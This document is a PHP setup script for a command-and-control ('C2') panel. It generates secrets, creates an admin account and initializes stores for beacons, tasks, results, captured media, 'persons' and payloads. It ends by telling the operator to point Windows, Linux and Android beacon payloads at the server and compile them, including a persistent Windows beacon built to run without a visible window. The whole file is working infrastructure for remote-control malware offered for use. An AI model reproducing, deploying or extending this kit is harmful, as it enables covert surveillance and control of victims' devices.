<?php
// ====== C2 Panel — One-Time Setup ======
// Run via browser: http://yourserver/c2/setup.php
// Run via CLI:     php setup.php

$root = __DIR__;
$envFile = $root . '/.env';
$dataDir = $root . '/data';
$uploadDir = $root . '/uploads';
$isCli = (php_sapi_name() === 'cli');

function randomHex(int $len): string {
    return bin2hex(random_bytes($len / 2));
}

function writeln(string $s): void {
    if (php_sapi_name() === 'cli') echo $s . "\n";
    else echo htmlspecialchars($s) . "<br>\n";
    flush();
}

// ── Check if already set up ──
if (file_exists($envFile)) {
    $msg = '[!] .env already exists. Delete it first to re-run setup.';
    if ($isCli) { echo $msg . "\n"; exit(1); }
    else { echo "<h3>$msg</h3><p>Delete <code>.env</code> and <code>data/</code> to start fresh.</p>"; exit; }
}

// ── Generate secrets ──
$beaconSecret = randomHex(64);
$sessionSecret = randomHex(32);
writeln("[*] Generated BEACON_SECRET: $beaconSecret");
writeln("[*] Generated SESSION_SECRET: $sessionSecret");

// ── Admin credentials ──
if ($isCli) {
    echo "Enter admin username [admin]: ";
    $adminUser = trim(fgets(STDIN));
    if ($adminUser === '') $adminUser = 'admin';
    echo "Enter admin password (or leave blank to auto-generate): ";
    $adminPass = trim(fgets(STDIN));
    if ($adminPass === '') {
        $adminPass = substr(randomHex(16), 0, 12);
        echo "Auto-generated password: $adminPass\n";
    }
} else {
    // Web mode — show form if not submitted
    if (!isset($_POST['submit'])) {
        ?>
        <!DOCTYPE html><html><body style="font-family:monospace;margin:40px;background:#111;color:#0f0;">
        <h2>&#9888; C2 Panel Setup</h2>
        <form method="post">
        <p>Admin username: <input name="user" value="admin" style="background:#222;color:#0f0;border:1px solid #0f0;"></p>
        <p>Admin password (leave blank to auto-generate): <input name="pass" type="text" style="background:#222;color:#0f0;border:1px solid #0f0;"></p>
        <p><input type="submit" name="submit" value="Setup" style="background:#0f0;color:#000;border:0;padding:8px 20px;cursor:pointer;"></p>
        </form></body></html>
        <?php exit;
    }
    $adminUser = trim($_POST['user'] ?? 'admin');
    $adminPass = trim($_POST['pass'] ?? '');
    if ($adminPass === '') {
        $adminPass = substr(randomHex(16), 0, 12);
    }
}

// ── Write .env ──
$env = "BEACON_SECRET=$beaconSecret\n";
$env .= "SESSION_SECRET=$sessionSecret\n";
$env .= "DB_PATH=$dataDir\n";
$env .= "UPLOAD_DIR=$uploadDir\n";
file_put_contents($envFile, $env);
writeln("[+] .env created");

// ── Create directories ──
$dirs = [
    $dataDir,
    $uploadDir,
    $uploadDir . '/devices',
    $uploadDir . '/media',
    $uploadDir . '/persons',
    $root . '/humans',
];
foreach ($dirs as $dir) {
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
        writeln("[+] Created: " . str_replace($root . '/', '', $dir));
    }
}

// ── Create .gitkeep files ──
foreach ([$dataDir, $uploadDir] as $dir) {
    $gitkeep = $dir . '/.gitkeep';
    if (!file_exists($gitkeep)) file_put_contents($gitkeep, '');
}

// ── Create empty JSON files ──
$tables = ['beacons', 'tasks', 'results', 'media', 'files', 'browse_cache', 'persons', 'users', 'login_attempts', 'payloads'];
foreach ($tables as $t) {
    $path = "$dataDir/$t.json";
    if (!file_exists($path)) file_put_contents($path, '[]');
    writeln("[+] $t.json initialized");
}

// ── Create admin user ──
$hash = password_hash($adminPass, PASSWORD_BCRYPT);
$users = json_decode(file_get_contents("$dataDir/users.json") ?: '[]', true);
$users[] = ['username' => $adminUser, 'password_hash' => $hash];
file_put_contents("$dataDir/users.json", json_encode($users, JSON_PRETTY_PRINT));
writeln("[+] Admin user '$adminUser' created");

// ── Summary ──
$sep = str_repeat('─', 50);
writeln("\n$sep");
writeln("  SETUP COMPLETE");
writeln($sep);
writeln("  Panel URL:     (your server)/c2/");
writeln("  Username:      $adminUser");
writeln("  Password:      $adminPass");
writeln("  BEACON_SECRET: $beaconSecret");
writeln("  SESSION_SECRET: $sessionSecret");
writeln($sep);
writeln("  Now configure your beacon sources:");
writeln("    payload/windows/beacon_persist.c  — set CFG_HOST and CFG_SECRET");
writeln("    payload/windows/beacon_auto.c     — set CFG_HOST and CFG_SECRET");
writeln("    payload/linux/beacon_linux.c      — set CFG_HOST and CFG_SECRET");
writeln("    payload/android/.../Config.java   — set HOST and SECRET");
writeln($sep);
writeln("  Compile beacons (see README.md for full instructions):");
writeln("    Windows:  gcc -o beacon.exe beacon_persist.c -lws2_32 -lgdi32 -lvfw32 -mwindows -O2 -s");
writeln("    Linux:    gcc -o beacon beacon_linux.c -s -Os");
writeln("    Android:  Build with Android Studio or use Gradle");
writeln($sep);
if (!$isCli) echo "<p>Delete <code>setup.php</code> after setup.</p>";
